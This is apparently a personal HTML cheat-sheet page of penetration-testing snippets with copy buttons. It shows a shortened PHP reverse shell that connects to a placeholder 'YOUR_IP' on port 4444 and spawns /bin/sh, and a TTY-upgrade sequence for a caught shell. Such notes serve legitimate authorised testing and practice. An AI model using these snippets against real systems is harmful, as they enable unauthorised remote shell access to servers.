<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scripts</title>
    <link rel="stylesheet" href="script.css">
</head>
<body>

    <div class="wrapper">
        <a href="index.html" class="back-link">← index</a>
        
        <header>
            <h1>Personal Scripts</h1>
        </header>

        <!-- SCRIPT 1 -->
        <div class="script-item">
            <div class="script-meta">
                <span class="script-name">php-reverse-shell.phtml</span>
                <button class="mini-copy" onclick="copyCode('code1')">Copy</button>
            </div>
            <pre id="code1"><span>$ip =</span> 'YOUR_IP'; <span>$port =</span> 4444;
<span>$exec =</span> 'uname -a; w; id; /bin/sh -i';
<span>// Short pentestmonkey core</span></pre>
        </div>

        <!-- SCRIPT 2 -->
        <div class="script-item">
            <div class="script-meta">
                <span class="script-name">tty-stabilization.sh</span>
                <button class="mini-copy" onclick="copyCode('code2')">Copy</button>
            </div>
            <pre id="code2">python3 -c 'import pty; pty.spawn("/bin/bash")'
<span># Ctrl+Z</span>
stty raw -echo; fg
export TERM=xterm</pre>
        </div>

    </div>

    <script>
        function copyCode(id) {
            const text = document.getElementById(id).innerText;
            navigator.clipboard.writeText(text);
            // Αλλαγή κειμένου για επιβεβαίωση
            const btn = document.querySelector(`[onclick="copyCode('${id}')"]`);
            btn.innerText = 'Copied';
            setTimeout(() => btn.innerText = 'Copy', 1500);
        }
    </script>
</body>
</html>
